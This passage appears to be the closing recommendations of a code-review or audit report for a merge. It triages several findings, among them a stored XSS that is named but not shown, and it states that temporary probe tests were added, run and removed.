- **M-1** should be fixed but not by holding this merge: it is not exploitable, the fix is ~5 lines,
  and fixing it converts the round's one surviving mutant (M6c) into a killable one — file it as
  the first item of round 9.
- **M-2** is a real, exploitable stored XSS but is entirely outside this round's diff and this
  round's workstream. File it separately and at its own priority; do not let it gate #194.
- **L-1** through **L-4** are follow-ups.

I did not modify production code. Probes were added under
`internal/platform/github/zz_audit_probe*_test.go`, run, and deleted; `git diff --quiet` exits 0
and `git status --porcelain` is empty at the time of writing `[MEASURED]`.
